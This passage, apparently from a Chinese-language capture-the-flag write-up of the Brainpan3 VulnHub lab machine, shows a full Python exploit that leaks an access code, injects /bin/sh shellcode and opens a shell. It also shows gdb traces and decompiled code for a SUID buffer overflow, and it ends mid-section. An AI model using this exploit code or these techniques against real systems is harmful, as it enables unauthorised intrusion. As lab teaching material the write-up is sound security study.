class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br><span class="line">sh: 1: ckfuckfuckfuck@: not found</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>还可以在命令行中插入0来触发record_id中的易受攻击的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">aasdcasdc<span class="string">&quot; 0 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REPORT [aasdcasdc&quot;</span> 0 <span class="comment">#ckfuck@]</span></span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<h3 id="编写python脚本来利用"><a href="#编写python脚本来利用" class="headerlink" title="编写python脚本来利用"></a>编写python脚本来利用</h3><p> – 获取登录代码并登录<br> – 启用report功能<br> – 发送包含0选项的payload report<br> – 获取shell</p>
<p>以下代码自动完成了整个过程：</p>
<p>report.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from select import select</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">import telnetlib, sys, re, struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class NetcatClass:</span><br><span class="line">    def __init__(self, host, port):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Netcat Class init.</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = int(port)</span><br><span class="line">        self.delay = 0.05</span><br><span class="line">        self.linemode = False</span><br><span class="line">        self.sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private functions</span></span><br><span class="line">    def __check_state(self, timeout=0):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Check the socket it&#x27;s read, write and exception state </span></span><br><span class="line"><span class="string">        using select</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># we need abit of a delay to keep things</span></span><br><span class="line">        <span class="comment"># running smooth</span></span><br><span class="line">        sleep(self.delay)</span><br><span class="line">        <span class="built_in">return</span> select([self.sock], [self.sock], [self.sock], timeout)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># core functions</span></span><br><span class="line">    def connect(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Connect to host</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, self.port))</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"> </span><br><span class="line">    def close(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Close the connection</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def recv(self, size=4096):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Recieve all data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> readable:</span><br><span class="line">                <span class="comment"># while socket readable...</span></span><br><span class="line">                <span class="keyword">while</span> readable:</span><br><span class="line">                    <span class="comment"># collect all data</span></span><br><span class="line">                    data += self.sock.recv(size)</span><br><span class="line">                    <span class="comment"># re-check socket&#x27;s state</span></span><br><span class="line">                    readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="built_in">return</span> data</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def send(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> writable:</span><br><span class="line">                <span class="keyword">if</span> self.linemode:</span><br><span class="line">                    data += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                self.sock.sendall(data)</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def sendrecv(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send and recieve data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.send(data)</span><br><span class="line">        <span class="built_in">return</span> self.recv()</span><br><span class="line"> </span><br><span class="line">    def interact(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Interactive telnet client</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            t = telnetlib.Telnet()</span><br><span class="line">            t.sock = self.sock</span><br><span class="line">            t.interact()</span><br><span class="line">            t.close()</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            self.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">def exploit(host, port):</span><br><span class="line">    <span class="comment"># connect</span></span><br><span class="line">    s = NetcatClass(host, port)</span><br><span class="line">    <span class="comment"># make all sends being treathed as line&#x27;s eq. add a \n</span></span><br><span class="line">    s.linemode = True</span><br><span class="line">    s.connect()</span><br><span class="line">    <span class="comment"># recieve banner</span></span><br><span class="line">    s.recv()</span><br><span class="line">    <span class="comment"># send formatstring pattern and read response containing access code    </span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Leak access code&#x27;</span></span><br><span class="line">    acccode = re.findall(r<span class="string">&quot;INVALID ACCESS CODE: (.*?)\n&quot;</span>, s.sendrecv(<span class="string">&#x27;%3$d&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> not acccode:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!] Failed to get access code!&#x27;</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="built_in">exit</span>()  </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Access code leaked: &#123;&#125;&#x27;</span>.format(acccode[0])</span><br><span class="line">    <span class="comment"># send access code</span></span><br><span class="line">    s.sendrecv(acccode[0])</span><br><span class="line">    <span class="comment"># enable report feature</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Enabling report feature&#x27;</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    s.sendrecv(253 * <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    <span class="comment"># create payload</span></span><br><span class="line">    <span class="comment"># linux/x86 Shellcode execve (&quot;/bin/sh&quot;) - 21 Bytes</span></span><br><span class="line">    <span class="comment"># http://shell-storm.org/shellcode/files/shellcode-752.php</span></span><br><span class="line">    shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">    <span class="comment"># .bss:0804B0A0 ; char REPORT[500]</span></span><br><span class="line">    <span class="comment"># strncpy(REPORT, buf, 100u);</span></span><br><span class="line">    __bss_REPORT = 0x0804B0A0</span><br><span class="line">    <span class="comment"># construct payload report  </span></span><br><span class="line">    payload  = <span class="string">&quot;AAA&quot;</span></span><br><span class="line">    payload += p(__bss_REPORT + 7)</span><br><span class="line">    payload += shellcode</span><br><span class="line">    <span class="comment"># inject double qoute and a 0 to trigger</span></span><br><span class="line">    <span class="comment"># the vulnerable code in record_id</span></span><br><span class="line">    payload += <span class="string">&#x27;&quot; 0 #&#x27;</span></span><br><span class="line">    <span class="comment"># send payload report</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Sending payload report&#x27;</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    s.sendrecv( payload )</span><br><span class="line">    <span class="comment"># interactive shell?</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Dropping into shell&#x27;</span></span><br><span class="line">    s.send(<span class="string">&#x27;python -c &quot;import pty;pty.spawn(\&#x27;</span>/bin/bash\<span class="string">&#x27;)&quot;&#x27;</span>)</span><br><span class="line">    s.interact()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit(<span class="string">&#x27;192.168.56.117&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后执行漏洞利用程序为anansi用户获取了一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># python report.py </span></span><br><span class="line">[+] Leak access code</span><br><span class="line">[+] Access code leaked: 2602</span><br><span class="line">[+] Enabling report feature</span><br><span class="line">[+] Sending payload report</span><br><span class="line">[+] Dropping into shell</span><br><span class="line">anansi@brainpan3:/$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan3:/$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">anansi@brainpan3:/$ ls</span><br><span class="line">ls</span><br><span class="line">bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz</span><br><span class="line">boot  home        lib             mnt    root  srv   usr  vmlinuz.old</span><br><span class="line">dev   initrd.img  lost+found      opt    run   sys   var</span><br><span class="line">anansi@brainpan3:/$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">anansi@brainpan3:/home$ ls</span><br><span class="line">ls</span><br><span class="line">anansi  puck  reynard</span><br><span class="line">anansi@brainpan3:/home$ <span class="built_in">cd</span> anansi</span><br><span class="line"><span class="built_in">cd</span> anansi</span><br><span class="line">anansi@brainpan3:/home/anansi$ ls</span><br><span class="line">ls</span><br><span class="line">REPORTS  lapinblanc.txt</span><br><span class="line">anansi@brainpan3:/home/anansi$ cat lapinblanc.txt</span><br><span class="line">cat lapinblanc.txt</span><br><span class="line"></span><br><span class="line">                     _       _</span><br><span class="line">                    / \     / \</span><br><span class="line">                   &#123;   &#125;   &#123;   &#125;</span><br><span class="line">                   &#123;   &#123;   &#125;   &#125;</span><br><span class="line">                    \   \ /   /</span><br><span class="line">                     \   Y   /</span><br><span class="line">                     .-<span class="string">&quot;`&quot;</span>`<span class="string">&quot;-.</span></span><br><span class="line"><span class="string">                   ,`         `.</span></span><br><span class="line"><span class="string">                  /             \</span></span><br><span class="line"><span class="string">                 /               \</span></span><br><span class="line"><span class="string">                &#123;     ;&quot;</span><span class="string">&quot;;,       &#125;</span></span><br><span class="line"><span class="string">                &#123;  /&quot;</span>;`<span class="string">&#x27;`,;       &#125;</span></span><br><span class="line"><span class="string">                 \&#123;  ;`,&#x27;</span>`;.     /</span><br><span class="line">                  &#123;  &#125;`<span class="string">&quot;&quot;</span>`  &#125;   /&#125;</span><br><span class="line">                  &#123;  &#125;      &#123;  //  f o l l o w</span><br><span class="line">                  &#123;||&#125;      &#123;  /       m e</span><br><span class="line">                  `<span class="string">&quot;&#x27;       `&quot;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub202.jpg"></p>
<h3 id="reynard"><a href="#reynard" class="headerlink" title="reynard"></a>reynard</h3><p>在box上寻找时，发现reynard文件夹是可读的，并且在“/private/”文件夹中具有SUID可执行文件和加密文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/reynard/private$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwx--- 2 reynard webdev  4.0K Jun 10  2015 .</span><br><span class="line">drwxr-xr-x 3 reynard reynard 4.0K Jun 10  2015 ..</span><br><span class="line">-rwsr-xr-x 1 reynard reynard 5.5K May 19  2015 cryptor</span><br><span class="line">-r-------- 1 reynard reynard   77 May 21  2015 sekret.txt.enc</span><br><span class="line">anansi@brainpan3:/home/reynard/private$ ./cryptor</span><br><span class="line">./cryptor</span><br><span class="line">Usage: ./cryptor file key</span><br></pre></td></tr></table></figure>

<p>将两个文件都下载到了本地计算机，并开始分析cryptor可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/home/anansi$ cp /home/reynard/private/cryptor .</span><br><span class="line">cp /home/reynard/private/cryptor .</span><br><span class="line">anansi@brainpan3:/home/anansi$ ls</span><br><span class="line">ls</span><br><span class="line">REPORTS  cryptor  lapinblanc.txt</span><br><span class="line">anansi@brainpan3:/home/anansi$ python -m SimpleHTTPServer 8080</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 ...</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:45:39] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:45:48] <span class="string">&quot;GET /cryptor HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [06/Feb/2020 05:46:07] <span class="string">&quot;GET /lapinblanc.txt HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub203.jpg"></p>
<p>下面是它的c语言伪代码</p>
<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int a1, char **a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_80485ED(a2[1], a2[2]);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s file key\n&quot;</span>, *a2);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_80485ED</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_80485ED(char *src, char *nptr)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; // eax</span><br><span class="line">  int v3; // ebx</span><br><span class="line">  int v4; // eax</span><br><span class="line">  char s[100]; // [esp+Ch] [ebp-78h]</span><br><span class="line">  int v7; // [esp+70h] [ebp-14h]</span><br><span class="line">  FILE *stream; // [esp+74h] [ebp-10h]</span><br><span class="line">  FILE *v9; // [esp+78h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  memset(dest, 0, 0x64u);</span><br><span class="line">  memset(s, 0, 0x64u);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(src) &lt;= 0x74 )</span><br><span class="line">    strcpy(s, src);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strncpy(s, src, 0x5Au);</span><br><span class="line">  v2 = &amp;s[strlen(s)];</span><br><span class="line">  *(_DWORD *)v2 = 1668179246;</span><br><span class="line">  v2[4] = 0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] saving to %s\n&quot;</span>, s);</span><br><span class="line">  strcpy(dest, nptr);</span><br><span class="line">  v9 = fopen(src, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( stream = fopen(s, <span class="string">&quot;w&quot;</span>); ; fputc(v4 ^ v3, stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = fgetc(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v7 == -1 )</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">      v3 = (char)v7;</span><br><span class="line">      v4 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    fclose(v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从main函数开始，可以看到它将2个参数filename和key传递给cryptFile函数。在此函数中，它将对给定的文件名进行奇怪的长度检查，如果长度小于或等于116个字符，则会将完整文件名复制到100字节的pOutFilename缓冲区中，从而导致16字节的溢出。现在这还不足以溢出该函数的返回地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stack layout</span><br><span class="line">-00000078 pOutFile        db 100 dup(?)</span><br><span class="line">-00000014 DataByte        dd ?</span><br><span class="line">-00000010 fsin            dd ?                    ; offset</span><br><span class="line">-0000000C fsout           dd ?                    ; offset</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 pFile           dd ?                    ; offset</span><br><span class="line">+0000000C pKey            dd ?                    ; offset</span><br></pre></td></tr></table></figure>

<p>但是，从cryptFile返回并离开main函数时，会发生有趣的事情。由于主要功能以leave指令退出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:08048786                 call    sub_80485ED</span><br><span class="line">.text:0804878B                 mov     eax, 0</span><br><span class="line">.text:08048790</span><br><span class="line">.text:08048790 locret_8048790:                         ; CODE XREF: main+26↑j</span><br><span class="line">.text:08048790                 leave</span><br><span class="line">.text:08048791                 retn</span><br></pre></td></tr></table></figure>

<p>leave说明与以下内容相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>

<p>它有效地还原了堆栈指针，现在，在leave指令上放置一个断点并以116个字符的文件名启动可执行文件时，我们可以看到发生了什么</p>
<p>(gdb中调试的效果)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0xbffff400 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">ESP: 0xbffff480 --&gt; 0xbffff69c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x8048790 (leave)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048783:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x8048786:    call   0x80485ed</span><br><span class="line">   0x804878b:    mov    eax,0x0</span><br><span class="line">=&gt; 0x8048790:    leave  </span><br><span class="line">   0x8048791:    ret    </span><br><span class="line">   0x8048792:    xchg   ax,ax</span><br><span class="line">   0x8048794:    xchg   ax,ax</span><br><span class="line">   0x8048796:    xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff480 --&gt; 0xbffff69c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff484 --&gt; 0xbffff711 --&gt; 0x53530041 (<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">0008| 0xbffff488 --&gt; 0xbffff508 --&gt; 0x0 </span><br><span class="line">0012| 0xbffff48c --&gt; 0xb7e6fe46 (:    mov    DWORD PTR [esp],eax)</span><br><span class="line">0016| 0xbffff490 --&gt; 0x3 </span><br><span class="line">0020| 0xbffff494 --&gt; 0xbffff534 --&gt; 0xbffff686 (<span class="string">&quot;/root/vulnhub/brainpan3/cryptor&quot;</span>)</span><br><span class="line">0024| 0xbffff498 --&gt; 0xbffff544 --&gt; 0xbffff713 (<span class="string">&quot;SSH_AGENT_PID=4019&quot;</span>)</span><br><span class="line">0028| 0xbffff49c --&gt; 0xb7fdd860 --&gt; 0xb7e59000 --&gt; 0x464c457f </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048790 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>EBP（0xbffff400）指向文件名缓冲区，并在执行成为ESP的离开指令时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ESP: 0xbffff404 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x8048791 (ret)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048786:    call   0x80485ed</span><br><span class="line">   0x804878b:    mov    eax,0x0</span><br><span class="line">   0x8048790:    leave  </span><br><span class="line">=&gt; 0x8048791:    ret    </span><br><span class="line">   0x8048792:    xchg   ax,ax</span><br><span class="line">   0x8048794:    xchg   ax,ax</span><br><span class="line">   0x8048796:    xchg   ax,ax</span><br><span class="line">   0x8048798:    xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff404 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0008| 0xbffff40c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0012| 0xbffff410 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0016| 0xbffff414 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0020| 0xbffff418 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0024| 0xbffff41c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0028| 0xbffff420 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048791 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>最后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ESP: 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff40c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0008| 0xbffff410 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0012| 0xbffff414 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0016| 0xbffff418 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0020| 0xbffff41c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0024| 0xbffff420 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0028| 0xbffff424 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x41414141 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>那么该如何利用呢？请记住，密钥存储在全局缓冲区中，似乎cryptor是用可执行的堆栈和内存编译的，因此可以将Shellcode放在密钥缓冲区中，并在文件名缓冲区溢出中使用以返回该Shellcode来执行该Shellcode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploit:</li>
</ul>
